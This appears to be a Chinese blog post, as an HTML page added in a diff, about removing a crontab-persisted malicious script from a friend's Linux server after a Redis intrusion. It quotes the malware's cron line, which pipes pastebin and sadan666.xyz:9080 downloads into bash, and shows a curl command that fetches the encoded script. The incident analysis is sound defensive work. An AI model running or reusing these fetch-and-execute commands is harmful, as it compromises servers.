@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="MiMonarchRD" />
+  
+  
+  <title>记一次老友的Linux服务器被恶意程序入侵并解决的过程 | Hexo</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="学习呦,恶意入侵Linux服务器,挖矿,运维安全," />
+  
+
+  
+  <meta name="description" content="写点东西的地方">
+
+  
+
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2019-04-10",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "MiMonarchRD",
+    share: {"twitter":false,"facebook":false,"weibo":true,"qq":true,"wechat":true},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  
+<script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">小Blogs</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | Programing is an art form.</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/tags/" target="_self">标签</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self">友链</a>
+      
+        <a href="/about/" target="_self">关于</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/MIMONATCH/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/tags/" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/friends/" target="_self">
+            友链
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/about/" target="_self">
+            关于
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2020-06-14
+    </span>
+    
+      <span>
+        | <a href="/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/"><i class="fa fa-bookmark"></i>学习呦</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    记一次老友的Linux服务器被恶意程序入侵并解决的过程
+  </h1>
+  
+  <article class="passage-article">
+    <p>首先放一个老友的连接：<a href="http://yuyy.info" target="_blank" rel="noopener">http://yuyy.info</a></p>
+<p>恶意程序名称：</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-7.png" alt=""></p>
+<p>可能是这个</p>
+<p>最近的日子正是毕业的日子，也是最忙的日子。老友给我发了条信息</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-1.png" alt=""></p>
+<p>我去，怎么就中招了呢</p>
+<p>通过ssh登录老友的服务器，<strong>发现登录的时候要卡很久，通过强制中断ctrl+c才能看见用户提示符</strong></p>
+<p>用top命令查看下现阶段运行进程情况，top命令简单说就是监控Linux中运行的进程的在系统中情况</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-2.png" alt=""></p>
+<p>好家伙</p>
+<p>通常的这些恶意进程是无法直接通过kill杀死的，有保护进程或者说有定时任务会重启什么的。</p>
+<p>既然看见了这个进程，就进入/proc/$proc_num(进程号)/中cat里面的exe文件，这个文件夹是内存中运行的进程的地方，找到这个图中的“1056”号文件夹，cat这个exe，这个文件直接指向可执行程序。</p>
+<p>这里没有截图，不过执行cat后的结果是提示这个可执行文件已经删除了</p>
+<p>所以这个恶意程序，通过了服务器中的某一个开放的端口扫描到了靶机，之后通过扫描漏洞进行渗透，这一次的入侵老友说是通过redis的开放端口，老友为了方便，直接开放了6789端口，并且将本仅能本地访问的redis的IP改成了4个0。</p>
+<p>为了不让你抓到这个程序，他在执行完后就自我删除了。你通过ps -ef命令是找不到脚本的位置的</p>
+<p>执行的内容会放一个脚本，也会简单说明执行了什么命令在服务器上，也会说明如何得到的这个脚本。</p>
+<p>好吧，现在就一步步来解决问题吧</p>
+<p>首先进行的一些常规的操作</p>
+<p>最基本的操作，改root用户密码，停止redis服务。我是将我好友上面的apache，mysql，nginx等服务都停止了。防止恶意程序会再扫描服务器漏洞进行入侵。</p>
+<p>下一步操作，进入阿里云的实例控制台中的防火墙，或者安全策略</p>
+<p>禁用一些不需要的端口</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-5-1024x137.png" alt=""></p>
+<p>切记不要图方便开启xxxx-xxxx号端口的危险行为</p>
+<p>之后，我前面已经提到了，关闭一些服务</p>
+<p>找到这个脚本</p>
+<p>既然上文已经提到是先下载，再执行，后删除。那么怎么定位这个脚本呢？因为如果你通过kill来处理掉这个进程，过一会儿就又会启动。这说明要么就是守护进程，要么就是在定时任务中。通常如果是一个守护进程，恶意程序是不会让你使用类似top或者ps命令查看到此类进程。</p>
+<p>进程隐藏的方式的恶意程序要比这次对付的程序强大的多，这个先不提及</p>
+<p>因为直接cat定时任务crontab很快速就先看了</p>
+<p>来看看服务器中可怜的定时任务</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-10.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-11.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-12.png" alt=""></p>
+<p>并且，在bin目录下，也生成了两个可执行的sh</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-15.png" alt=""></p>
+<p>可以见到还上锁了</p>
+<p>内容如下：</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-16-1024x90.png" alt=""></p>
+<p>可见会从不同的url下载恶意程序</p>
+<p>这里说明下，如果要解锁一个文件，要用下面的命令</p>
+<pre><code>chattr -i xxx</code></pre><p>同时有一个定时文件是定时执行这两个文件</p>
+<p><strong>这里要注意一点，因为有些恶意程序会劫持命令，比如rm命令会给你换名字，或者不会让你执行</strong></p>
+<p>如果有这种情况，可以使用busybox，busybox相当于一个集成命令的工具，里面有一些常用的命令，使用busybox的时候只要加上这个工具名字的前缀就可</p>
+<pre><code>busybox rm xxx</code></pre><p>cat出定时任务，可以看到下面的内容</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-6.png" alt=""></p>
+<p>有点小</p>
+<pre><code>sed -i &apos;/aziplcr72qjhzvin/d&apos; /etc/hosts; (python -c &apos;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&apos;||curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash</code></pre><p>第一部分：</p>
+<pre><code>sed -i &apos;/aziplcr72qjhzvin/d&apos; /etc/hosts;</code></pre><p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-9.png" alt=""></p>
+<p>。。</p>
+<p>往hosts文件中写东西，是加密的。主要就是将0.0.0.0解析到一个网址</p>
+<p>第二部分：</p>
+<pre><code>python -c &apos;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&apos;</code></pre><p>使用urllib2库来执行一条python语句，打开后面那个网址</p>
+<p>第三部分：</p>
+<pre><code>curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash</code></pre><p>都是从后面那个url中curl和wget一段经过base64加密的脚本之后执行，注意里面的选项都是启用了静默模式的，不会有任何输出，所以我们无法通过日志等文件查看这两条命令的执行记录</p>
+<p>所以，有了这个，找到脚本不难，但不是说在服务器上找，而是我们直接请求他的url获得脚本</p>
+<pre><code>(curl -fsSL https://pastebin.com/raw/UhUmR517||wget -q -O - https://pastebin.com/raw/UhUmR517)|sed &apos;s/\r//&apos;</code></pre><p>这里的url和上面的不同，这里的url是从其他定时任务文件中得到的，上面有截图显示这个url，但是他们指向的都是一个恶意脚本</p>
+<p>将得到的bash64结果放到在线的解码器中</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-8.png" alt=""></p>
+<p>这就找到这个脚本了</p>
+<p>这里我将脚本放到这里供大家参考</p>
+<p>PS.wp不支持sh文件上传，就上传txt了，我已经将里面的一些部分更改，以防意外</p>
+<p><a href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip" target="_blank" rel="noopener">wakuang</a><a href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip" target="_blank" rel="noopener">下载</a></p>
+<p>通过这个文件的分析，能得到所有的cron定时任务文件都被写入了上面的命令，会在每时每刻都会执行上面的命令，获取到这个可执行的脚本，之后执行这个脚本删除它，脚本中再往定时任务，root的.bashrc文件中写入上述的命令。如果我们只是单纯的kill到那个恶意进程，定时任务会立刻执行重新下载脚本并执行，如果我们将定时任务中的任务删除，当我们每次通过ssh登录服务器时，会执行.bashrc文件，又开始了死循环</p>
+<p><strong>删除它</strong></p>
+<p>好的，我们已经简单的分析下，那么我们改怎么处理呢？难道说通过拼手速的方式？</p>
+<p>很简单的方法，如果恶意程序要用到curl和wget命令来下载恶意程序，那就。。</p>
+<p><strong>第一步</strong>：删除wget命令和curl命令，或者将bin目录下面的两者移出去，这样先阻断了通过网络再次下载进程</p>
+<p><strong>第二步</strong>：删除所有的定时任务前，把crond定时任务的服务关了，并且，直接删了定时任务执行的命令。这样，写在定时任务中的命令就失效了</p>
+<p><strong>第三步</strong>：kill掉恶意程序进程，现在kill掉。定时任务失效，wget和curl都用不了，无法从网上下载恶意程序</p>
+<p><strong>第四步</strong>：清理定时任务文件，并且要清理.bashrc下面写入的下载恶意脚本命令，要不然下次连接服务器就又会执行下载命令</p>
+<p><strong>第五步</strong>：查看有没有可疑进程等</p>
+<p>我这边直接top了下，服务器恢复了正常</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-13.png" alt=""></p>
+<p><strong>总结</strong></p>
+<p>基本来说，这是一次正式挖矿前的清理服务器其他挖矿程序和注入自己恶意程序的操作。并不是正真的挖矿程序</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-14.png" alt=""></p>
+<p>恶意程序其中的一部分</p>
+<p>上图可以见到这个恶意脚本会kill一些其他的挖矿脚本，之后就是上述提到的步骤。我通过分析这个脚本并没有找到挖矿程序。通过top分析也没有进程占用异常的资源的情况，所以，我仅觉得是挖矿前的“清理”，同行的恶意竞争？？笑~</p>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/%E6%81%B6%E6%84%8F%E5%85%A5%E4%BE%B5Linux%E6%9C%8D%E5%8A%A1%E5%99%A8/"><i class="fa fa-tags"></i>恶意入侵Linux服务器</a>
+     
+      <a href="/tags/%E6%8C%96%E7%9F%BF/"><i class="fa fa-tags"></i>挖矿</a>
+     
+      <a href="/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"><i class="fa fa-tags"></i>运维安全</a>
+    
+    </div>
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title">博客推荐</h5>
+          
+            <span class="site-footer-item">
+              <a href="http://yuyy.info/" target="_blank">YuYY</a>
+            </span>
+          
+        </div>
+      
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: huzi19980410@gmail.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+        <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+          
+            <div>
+              <img src="/images/wechat.png" alt="WeChat">
+              
+                <p>WeChat</p>
+              
+            </div>
+          
+            <div>
+              <img src="/images/alipay.png" alt="AliPay">
+              
+                <p>AliPay</p>
+              
+            </div>
+          
+        </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/passages/linux-e4-b8-ad-e7-9a-84-e5-92-8c/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/passages/e5-a4-a7-e5-a4-b4-e8-8f-9c-e4-bb-b7-e6-a0-bc-e5-ae-8c-e5-85-a8-e6-94-bb-e7-95-a5/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+      <a href="javascript:void(0);" id="site-reward">
+        <i class="fa fa-thumbs-up"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+    <a id="share-btn-weibo" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-weibo"></i>
+    </a>
+  
+  
+    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-qq"></i>
+    </a>
+  
+  
+    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-wechat"></i>
+    </a>
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
